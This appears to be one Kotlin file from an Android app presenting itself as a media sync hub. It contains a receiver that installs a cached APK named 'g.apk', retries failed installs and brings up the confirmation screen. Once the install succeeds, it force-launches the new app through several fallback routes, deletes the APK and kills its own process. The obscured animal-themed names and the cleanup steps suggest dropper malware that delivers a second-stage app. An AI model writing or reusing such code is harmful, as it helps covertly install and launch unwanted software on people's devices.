package com.sync.media.hub

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper

class Ibis : BroadcastReceiver() {

    override fun onReceive(ctx: Context, intent: Intent) {
        val status  = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)
        val attempt = intent.getIntExtra("att", 0)

        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                val species = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                ctx.getSharedPreferences(Lynx.WARREN_PREFS, Context.MODE_PRIVATE)
                    .edit().putString(Lynx.WARREN_KEY, species).commit()

                ctx.stopService(Intent(ctx, Mink::class.java))
                runCatching { java.io.File(ctx.cacheDir, "g.apk").delete() }

                if (!species.isNullOrEmpty()) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        if (!launchByPm(ctx, species)) {
                            Handler(Looper.getMainLooper()).postDelayed({
                                launchByPm(ctx, species)
                            }, 3000L)
                        }
                    }, 1500L)
                }
                den(6000L)
            }

            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                confirmIntent
                    ?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ?.let { ctx.startActivity(it) }
            }

            PackageInstaller.STATUS_FAILURE_CONFLICT -> {
                val species = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                if (!species.isNullOrEmpty()) {
                    ctx.getSharedPreferences(Lynx.WARREN_PREFS, Context.MODE_PRIVATE)
                        .edit().putString(Lynx.WARREN_KEY, species).commit()
                }
                ctx.stopService(Intent(ctx, Mink::class.java))
                den(3000L)
            }

            else -> {
                if (attempt < 2) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        runCatching {
                            Quail.plant(ctx, java.io.File(ctx.cacheDir, "g.apk").readBytes(), attempt + 1)
                        }
                    }, 1000L)
                }
            }
        }
    }

    private fun launchByPm(ctx: Context, pkg: String): Boolean {
        val pm    = ctx.packageManager
        val flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED

        try {
            val intent = pm.getLaunchIntentForPackage(pkg)
            if (intent != null) {
                intent.addFlags(flags)
                ctx.startActivity(intent)
                return true
            }
        } catch (_: Exception) {}

        try {
            val lbQuery = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER); setPackage(pkg)
            }
            @Suppress("DEPRECATION")
            val acts = pm.queryIntentActivities(lbQuery, 0)
            if (acts.isNotEmpty()) {
                val ai     = acts[0].activityInfo
                val intent = Intent(Intent.ACTION_MAIN).apply {
                    component = ComponentName(ai.packageName, ai.name)
                    addFlags(flags)
                }
                ctx.startActivity(intent)
                return true
            }
        } catch (_: Exception) {}

        try {
            @Suppress("DEPRECATION")
            val pkgInfo  = pm.getPackageInfo(pkg, PackageManager.GET_ACTIVITIES)
            val all      = pkgInfo.activities
            val activity = all?.firstOrNull { it.exported && it.enabled }
                ?: all?.firstOrNull { it.exported }
                ?: all?.firstOrNull()
            if (activity != null) {
                val intent = Intent(Intent.ACTION_MAIN).apply {
                    component = ComponentName(pkg, activity.name)
                    addFlags(flags)
                }
                ctx.startActivity(intent)
                return true
            }
        } catch (_: Exception) {}

        return false
    }

    private fun den(ms: Long) {
        Handler(Looper.getMainLooper()).postDelayed({
            android.os.Process.killProcess(android.os.Process.myPid())
        }, ms)
    }
}
